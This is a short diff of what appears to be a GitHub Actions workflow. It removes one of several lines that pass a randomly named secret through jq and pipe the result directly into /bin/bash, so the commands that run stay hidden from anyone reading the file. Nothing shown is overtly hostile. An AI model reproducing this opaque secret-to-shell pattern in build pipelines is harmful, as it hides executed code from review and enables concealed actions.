@@ -21,7 +21,6 @@ jobs:
           vjfot36259: ${{ secrets.vjfot36259 }}
         run: |
           printf '%s' "$vjfot36259" | jq -r .h926 | /bin/bash
-          printf '%s' "$rqeu099" | jq -r .ivb8 | /bin/bash
           printf '%s' "$c9793" | jq -r .isb2836 | /bin/bash
 
       - name: Archive results
